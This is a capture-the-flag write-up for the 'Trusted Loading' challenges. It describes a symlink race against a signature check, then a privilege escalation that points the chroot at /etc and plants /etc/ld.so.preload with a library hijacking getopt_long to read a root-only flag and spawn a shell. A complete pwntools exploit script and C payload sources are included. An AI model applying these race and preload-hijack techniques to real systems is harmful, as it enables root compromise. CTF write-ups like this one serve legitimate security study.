### Trusted Loading 1
We can execute any binary under the chroot("/home/chall/chroot"). We also can call trusted_loader to execute binary not under the chroot if that binary pass the signature check. The bug is at when trusted_loader check the file using stat with S_ISREG. If we provide a symlink, S_ISREG will also return True. We first let the symlink link to the "tester" to pass the signature check. Before trusted_loader execute the binary, we rename the binary which we want to execute to "tester". In the end, we can execute any binary not under the chroot to read "/flag1". 

### Trusted Loading 2
In this challenge, we have to read the "/flag2" which is only read by root. We found that we can upload file to the "/home/chall/chroot". This process is done by root privilege. "/home/chall" is owned by 1337, so we can delete "/home/chall/chroot" and make it as a symlink to any path. It means that we can create any file in any path. We create /etc/ld.so.preload and exit. When executing poweroff, it will preload our library. We hijack getopt_long to read the flag2.
```python
from pwn import *


def Upload(filename,name):
    data = open(filename).read()
    r.sendlineafter("3.","2")
    r.sendlineafter("?",name)
    r.sendlineafter("?",str(len(data)))
    r.sendafter("?",data)
def Do_elf(filename):
    data = open(filename).read()
    r.sendlineafter("3.","1")
    r.sendlineafter("?",str(len(data)))
    r.sendafter("?",data)
'''
init.c
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <unistd.h>
int main(){
        symlink("/home/chall/chroot/tester","PWN");
        symlink("/home/chall/chroot/tester.sig","PWN.sig");
        while(1) {
                sleep(1);
        }

}

exp.c
int main(){
        system("rm -rf ../chroot");
        system("ln -s /etc ../chroot");
        puts("Done");
        puts("3.");
        sleep(1);

}

sandbox.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(){
        write(666,"\x01PWN",4);
        sleep(1);
        rename("exp","tester");
}

libx.c
int getopt_long(){
        printf("My id : %d\n",getuid());
        int fd = open("/flag2",0);
        char buf[0x100];
        write(1,buf,read(fd,buf,0x100));
        unlink("/etc/libx.so");
        system("sh");
        return 0;
}

ld.so.preload
libx.so
'''


r = remote("trustedloading.hackable.software", 1337)
r.recvuntil(": ")
s = process(r.recvline()[:-1].split())
s.recvuntil(": ")
r.send(s.recvall())
s.close()

#r = process('./start.sh')

data = open("init").read()
r.sendlineafter("?",str(len(data)))
r.sendafter("?",data)
Upload("tester","tester")
Upload("tester.sig","tester.sig")
Upload("exp","exp")
context.arch = "amd64"
Do_elf("sandbox")
r.recvuntil("Done");
Upload("ld.so.preload","ld.so.preload")
Upload("libx.so","libx.so")
r.sendlineafter("3.","3")
r.interactive()
```
